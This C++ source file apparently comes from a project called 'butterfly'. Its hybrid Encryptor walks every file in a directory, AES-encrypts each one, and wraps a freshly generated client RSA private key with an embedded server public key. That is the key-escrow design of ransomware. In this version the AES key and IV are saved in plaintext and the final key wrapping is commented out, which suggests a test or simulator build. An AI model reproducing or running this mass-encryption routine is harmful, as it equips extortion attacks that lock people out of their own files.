
#include "crypto/encryptor.h"

namespace butterfly
{

namespace hybrid
{

Encryptor::Encryptor(int keySize, const std::string &aesKeyDbFilepath) : _keySize(keySize),  _aesKeyDbFilepath(aesKeyDbFilepath),
                                                                         _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                                                         _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                                                         _aesEncryptor(new aes::AESEncryptor()),
                                                                         _dirIterator(new DirectoryIterator()),
                                                                         _aesKeyDatabase(new AESKeyDatabase(_aesKeyDbFilepath))
{
    LOG_TRACE("Create class Encryptor");
}

Encryptor::~Encryptor()
{

}

void Encryptor::invokeDir(const std::string &path)
{
    // Encrypt the CPrivateRSA.pem file CPrivateRSA.bin
    encryptCPrivateRSA();

    // Get all files from provided directory path
    auto files =  _dirIterator->getAllFiles(path);

    // Generate the AES Key and IV
    if ( _aesEncryptor->generateAESKey() )
    {

        // If --protect is enabled
        std::string aeskey = _aesEncryptor->getAESKey();
        std::string aesiv = _aesEncryptor->getAESIv();

        butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
        butterfly::writeBinFile("AESIV.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));

        for (auto &file: files)
        {
            LOG_TRACE("FILE: " << file);
            encryptFileWithAES(file.string());
        }

        // Save the final AESKey.bin file
        //encryptFinalAESKeyWithRSA(aeskey, butterfly::ENC_AESKEY_FILENAME, butterfly::ENC_AESKEY_FILENAME);
        // Save the final AESIV.bin file
        //encryptFinalAESKeyWithRSA(aesiv, butterfly::ENC_AESIV_FILENAME, butterfly::ENC_AESIV_FILENAME);

    }

}

void Encryptor::encryptCPrivateRSA()
{
    // Get the CPrivateRSA.pem file string
    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();

    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();

    try
    {
        // Encrypt the CPrivateRSA.pem file string
        _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::ENC_CPRIVATERSA_FILENAME);
        // Get the encrypted CPrivateRSA.pem string
        std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
        // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
        _rsaEncryptorCPrivateRSA->saveEncryptedMsgToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc,_rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptFileWithAES(const std::string &filepath)
{

    try
    {
        // Encrypt the file with AES
        _aesEncryptor->encryptFile(filepath);

    } catch (AESEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptFinalAESKeyWithRSA(const std::string aesKeyStr, const std::string filename, const std::string &type)
{

    try
    {
        // Encrypt the AES Key String
        _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr, type);
        // Get the encrypted AES Key String
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
        // Save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->saveEncryptedMsgToFile(filename, aesKeyEnc,_rsaEncryptorAESKey->getEvpPkeySize(_rsaEncryptorAESKey->getEvpPkey()));

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptAESKeyFile(const std::string &filepath)
{
    std::string fileContent = butterfly::readBinFile(filepath);

    try
    {
        // encrypt the AES Key
        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), fileContent);
        // get the encrypted AES Key string
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
        // save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->saveEncryptedMsgToFile(filepath + ".bin", aesKeyEnc,_rsaEncryptorAESKey->getEvpPkeySize(_rsaEncryptorAESKey->getEvpPkey()));

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }
}

} // namespace hybrid

} // namespace butterfly
